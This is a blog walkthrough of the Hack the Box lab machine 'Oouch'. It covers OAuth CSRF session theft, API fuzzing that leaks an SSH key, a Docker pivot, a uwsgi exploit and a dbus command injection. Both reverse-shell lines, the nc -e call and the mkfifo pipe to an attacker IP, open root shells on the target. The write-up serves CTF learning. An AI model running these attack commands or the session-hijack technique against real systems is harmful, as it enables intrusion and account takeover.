+++
author = "Nick"
categories = ["hack the box", "Hard", "Linux", "CTF", "api", "csrf", "oauth", "wfuzz", "gobuster", "dbus", "uwsgi", "scp"]
date = 2020-08-01T14:59:00Z
description = ""
draft = false
image = "__GHOST_URL__/content/images/2020/05/info-1.png"
slug = "hack-the-box-oouch"
summary = "Welcome back everyone! Today we are tackling the Hack the Box machine - Oouch. It's listed as a Hard Linux machine."
tags = ["hack the box", "Hard", "Linux", "CTF", "api", "csrf", "oauth", "wfuzz", "gobuster", "dbus", "uwsgi", "scp"]
title = "Hack the Box - Oouch"

+++


Welcome back everyone! Today we are tackling the Hack the Box machine - Oouch. It's listed as a Hard Linux machine. Let's jump in.

As always we start off with our standard `nmap` scan: `nmap -sV -sC -p- -oA allscan 10.10.10.177`

Here are our results:
```
Nmap scan report for 10.10.10.177
Host is up (0.049s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp            49 Feb 11 19:34 project.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.50
|      Logged in as ftp
|      TYPE: ASCII
|      Session bandwidth limit in byte/s is 30000
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 8d:6b:a7:2b:7a:21:9f:21:11:37:11:ed:50:4f:c6:1e (RSA)
|_  256 d2:af:55:5c:06:0b:60:db:9c:78:47:b5:ca:f4:f1:04 (ED25519)
5000/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
| http-title: Welcome to Oouch
|_Requested resource was http://10.10.10.177:5000/login?next=%2F
8000/tcp open  rtsp
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest, HTTPOptions: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/html
|     Vary: Authorization
|     <h1>Bad Request (400)</h1>
|   RTSPRequest: 
|     RTSP/1.0 400 Bad Request
|     Content-Type: text/html
|     Vary: Authorization
|     <h1>Bad Request (400)</h1>
|   SIPOptions: 
|     SIP/2.0 400 Bad Request
|     Content-Type: text/html
|     Vary: Authorization
|_    <h1>Bad Request (400)</h1>
|_http-title: Site doesn't have a title (text/html).
|_rtsp-methods: ERROR: Script execution failed (use -d to debug)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.80%I=7%D=5/18%Time=5EC28FF3%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,64,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nContent-Type:\x20tex
SF:t/html\r\nVary:\x20Authorization\r\n\r\n<h1>Bad\x20Request\x20\(400\)</
SF:h1>")%r(FourOhFourRequest,64,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nCon
SF:tent-Type:\x20text/html\r\nVary:\x20Authorization\r\n\r\n<h1>Bad\x20Req
SF:uest\x20\(400\)</h1>")%r(HTTPOptions,64,"HTTP/1\.0\x20400\x20Bad\x20Req
SF:uest\r\nContent-Type:\x20text/html\r\nVary:\x20Authorization\r\n\r\n<h1
SF:>Bad\x20Request\x20\(400\)</h1>")%r(RTSPRequest,64,"RTSP/1\.0\x20400\x2
SF:0Bad\x20Request\r\nContent-Type:\x20text/html\r\nVary:\x20Authorization
SF:\r\n\r\n<h1>Bad\x20Request\x20\(400\)</h1>")%r(SIPOptions,63,"SIP/2\.0\
SF:x20400\x20Bad\x20Request\r\nContent-Type:\x20text/html\r\nVary:\x20Auth
SF:orization\r\n\r\n<h1>Bad\x20Request\x20\(400\)</h1>");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.30 seconds
```

Judging by our scan, a web vulnerability is our way in. We see a file in the FTP directory. So we'll log in to that and snag the file to see what's in it. When we take a peek we see it gives us 'structure' that might be in use.

![](/images/2020/05/image-18.png)

We'll keep this in mind. We also have something running on port 5000 as well as port 8000, both look to be web services. The service on port 8000 gives us an error on load and the service on 5000 is a registration / login page. We try to login with the basic admin/admin but that obviously doesn't work. So we'll register an account and try to login using that.

Once we login with our account we get a new set of options.

![](/images/2020/05/image-19.png)

The options here are pretty basic. While we manually poke around the page, we'll start up a `gobuster` to start enumerating what might be here. The standard set of lists did not turn up anything. Using some of the other discovery lists in `SecLists` - Raft-large-directories shows us there is an oauth location. That could be of use.

![](/images/2020/05/image-20.png)

Navigating to 10.10.10.177:5000/oauth brings us to an OAuth Endpoint page.

![](/images/2020/05/image-21.png)

It tells us to visit consumer.oouch.htb to connect, so we'll add these two hostnames to our hosts files and try to authenticate. Once we do that we are able to sign in again to verify our credentials.

![](/images/2020/05/image-22.png)

Again it errors out due to hostname resolution. We'll add authorization.oouch.htb to our hosts file as well. Once we do that, we are then rerouted back to the original landing page. We take some time to look at the URls previously provided. Going to `authorization.oouch.htb:8000` gives us an unexpected page.

![](/images/2020/05/image-23.png)

Here we can register an account to use for OAuth purposes. Now to progress any further you'll want a basic understanding of OAuth and how it functions. This is a brief [video explaining](https://www.youtube.com/watch?v=CPbvxxslDTU) the basics of how OAuth functions. Now that we know how it works, in short, we can take a look at these two good resources on how to exploit the service - [here](https://habr.com/en/post/449182/) and [here](https://dhavalkapil.com/blogs/Attacking-the-OAuth-Protocol/).

In order to leverage some of the mentioned attacks, we need a to find a CSRF or some other leaky info. Luckily for us there is a contact page that could help us out here. We will try to leverage a CSRF attack to obtain the same access as the adminitrator, hoping they are logged in.

We'll create an account on `authorization.oouch.htb:8000`. Once we do that we'll navigate back to `http://consumer.oouch.htb:5000/oauth/connect` and turn on our `Burpsuite` intercept. We then login with our standard account previously created and forward the first 3 requests. We eventually should be prompted with an option to authorize:

![](/images/2020/05/connect.png)

We don't want to Authorize this connection. We just want the token from Burpsuite.

![](/images/2020/05/token.png)

Here's how the process look in entirety.

![](/images/2020/05/oouch_get_token.gif)

Now that we have a token that is valid we'll then take this URL with the token code and send it to the contact field.

![](/images/2020/05/contact.png)

We then send the 'message'. We can now head over to `http://consumer.oouch.htb:5000/oauth/login`. This should give au another Authorization link, this time we will authorize it. If all goes well, we should now be the admin on the machine!

![](/images/2020/05/image-24.png)

We see another section now, called Documents. When we click on this link we have some more info given to us.

![](/images/2020/05/image-25.png)

Given these notes we know there is an api that has users and user data. We can alsu use that set of credentials to register applications. So if applications are allowed, where do they go? My first guess would be `/applications`. Turns out it is that but under the `authorize.oouch.htb:8000/oath` location. 20-20 hindsight, recursive `dirbuster` would have worked more effectivly... When we attempt to reach this page, we are greated with a password prompt. We'll use the supplied credentails to acces it. We keep getting denied. We'll lauch another `gobuster` against this url and see what we might find. Eventually we find `/oauth/applications/register`. We are then given some options to register our application:

![](/images/2020/05/image-26.png)

When we look at this we see we can choose some valuable info. We can send our redirect URI back to our attacking machine. So we register an app with the following:

![](/images/2020/05/image-32.png)

But I can't seem to access this application. Some research shows I need to go to the URL supplying all the parameters I previously made. So my application url would be as follows:
```
http://authorization.oouch.htb:8000/oauth/authorize/?client_id=IDHERE&redirect_uri=http://10.10.14.50:6969&grant_type=authorization_code&client_secret=SECRETHERE
```

When I try to access this it seemingly hangs. Now if I load up a `netcat` listener on my `redirect_uri` port, I get an HTTP request:

![](/images/2020/05/image-28.png)

This is good actually, this is the same response code we got previously when attempting the CSRF against the admin account. We'll use the same technique to try and get the admin account session data. We go back to the contact form and submit our link:

![](/images/2020/05/ouch_admin_session.gif)

Eventually we get back a sesionid cookie. We can now edit our local cookies an apply this one. We head over to `authorization.oouch.htb:8000` and see we are logged in as our test account. We open up our dev tools. Go to Storage. Then modify our sessionid value with our new one and boom, we get qtc's access.

![](/images/2020/05/image-29.png)

Now we see two more resource links, `Authorize` and `token`. Now when we try to go to `token` URL, `Burpsuite` gives us the response.

![](/images/2020/05/image-30.png" caption=")

We can only POST to this URL. If we try to send a POST to this page we get an error of 'Unsupported grant type"

![](/images/2020/05/image-33.png)

A quick search around the internet lead me to this [post](https://stackoverflow.com/questions/43201731/django-oauth2-unsupported-grant-type). Following this methodology of adding the variables we created in our application earlier should let us get some kind of token back.

We issue the following `curl` command:
```
curl -X POST 'http://authorization.oouch.htb:8000/oauth/token/' -H "Content-type: application/x-www-form-urlencoded" --data "grant_type=client_credentials&client_id=MrzSIKUdAWfqXVNiCZUHnaYmnw1EQpbl4FWWyupl&client_secret=CtHS7rPyQgOasuSPb7hPdwoUMAHmVnwLIIKmSsV2BtANlIohq8xH4bxT7sHHT2e6QNaAFa7UMtUAuA1d4DbN91Adm4WRVse3VqOp0x7uyntWbW9oi10bkgAxJDk9UsOR"
```

![](/images/2020/05/image-31.png)

We indeed get a access token back! I wasn't able to find much in terms of using this token under the OAuth structure. When we look back at what we've done so far we see that there is another strucure to use `/api/get_users`. When we navigate to that location and supply our access token, we get our users data set.

![](/images/2020/05/image-34.png)

However, there is nothing that usefull here. We'll use `wfuzz` to fuzz the second part of the function. There is a posibility we have other functions that follow the `get_` naming convention.

Command:
```
wfuzz -c -u "http://authorization.oouch.htb:8000/api/get_FUZZ/\?access_token=fPhAPOIWERJ1wyvsLe7EdGhXMSQs7V" -w /usr/share/seclists/Discovery/DNS/namelist.txt --hc 404
```

When this run, we are hidding the 404 errors. This should help us narrow down our results.

![](/images/2020/05/image-35.png)

Once it finishes we see there is indeed 3 variables we can use. The one that's really of interest is ssh. So we go over to the `/get_ssh` location with our authorization token and...

![](/images/2020/05/image-36.png)

We have an SSH key! Now the key needs some cleaning up but that's not a problem. We remove the leading JSON and the `\n` breaks to create a cohesive key. Once we have that done and our permissions set correctly, we can use it to `SSH` into the box!

![](/images/2020/05/image-37.png)

We get our users.txt file and start enumerating the box internally. We copy over `linpeas.sh` and see what might show. One of the biggest things that shows when this runs is the amount of network interfaces are shown. There are 8 interfaces, one of which is a docker interfaces.

![](/images/2020/05/image-38.png)

![](/images/2020/05/image-39.png)

This is a pretty large subnet space for a docker network. We'll want to scan it and see what could be there. We could do this bash shell and a ping scan but for a subnet this large we'll just copy of a [static binary of nmap](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap) and point it at our IP range.

That finishes eventually and we have a few addresses to work with. We try to `SSH` into them one at a time and finally are able to get into the `172.18.0.3` device.

![](/images/2020/05/image-40.png)

We're another machine deep, so we'll need to enumerate this machine. However, this time we don't have access available to commands like `wget`, `curl`, `netcat` or `socat`. We'll have to manually enumerate this box. 

Enumeration of running services show `uwsgi` being run frequently. This could be of use. We'll keep looking around at other exploitable areas as well.

When we `cat` the `.bash_history` we some commands being run from inside `/code`. We'll navigate there and see what might be of use. Reading through and analyzing the code we see an interesting import call: import dbus. This could be of use to use to create a payload and send it to our machine. Since the file is owned by root, we could have root access. No dice. It would seem root owning the file is the blockage here. 

So some googling around shows there is an exploit for `uwsgi` [here](https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py). So  we'll re-create this file on the first level machine - oouch. Then in order to get it onto the second level machine we can use `scp`. We also want to copy over `netcat` to create our shell since we know it's not on it natively.

Command:
`scp -i ~/.ssh/id_rsa exploitme.py qtc@172.18.0.3:/tmp`
`scp -i ~/.ssh/id_rsa nc qtc@172.18.0.3:/tmp`

Once we have the exploit onto the machine, we need to setup a `netcat` listener.

Command:
`nc -lvnp 4444`

Now we can run the exploit following the usage given in the code.

Command:
`python exploitme.py -m unix -u /tmp/uwsgi.socket -c "/tmp/nc -e /bin/bash 172.18.0.1 4444"`

![](/images/2020/05/ouchwebshell.gif)

Once we run it, we see a shell come back on our netcat listener as `www-data`. We then upgrade our shell session. In this case we want to re-attempt our dbus exploit from earlier since www-data might have rights to this service.

![](/images/2020/05/image-41.png)

Dbus is a system used to send commands to other applications at a low level. The usage for `dbus` rpc calls is as follows: 
`dbus-send --session --dest=<class> <namespace> <method> [<parameters>]`.

In this case we're supplying dbus with it's requested parameters but then feeding it the [`mkfifo` reverse shell command](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).

```
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block "string:;rm /tmp/.0; mkfifo /tmp/.0; cat /tmp/.0 | /bin/bash -i 2>&1 | nc 10.10.14.50 5555 >/tmp/.0;"
< /bin/bash -i 2>&1 | nc 10.10.14.50 5555 >/tmp/.0;"
```

I would consider this type of reverse shell fairly obscure unless you've done it before.

We start up a `netcat` listener on 5555 and issue our `dbus-send`. We get a shell back as root instantly.

![](/images/2020/05/oouchroot.gif)

There we have it, our root flag! This box was pretty difficult in my opinion. Especially since the CSRF wasn't always working on public boxes. Hopefully something was taken away from this write-up!

Think about sending me some respect over on HTB if you enjoyed the write-up! Here's my [profile](https://www.hackthebox.eu/home/users/profile/95635).



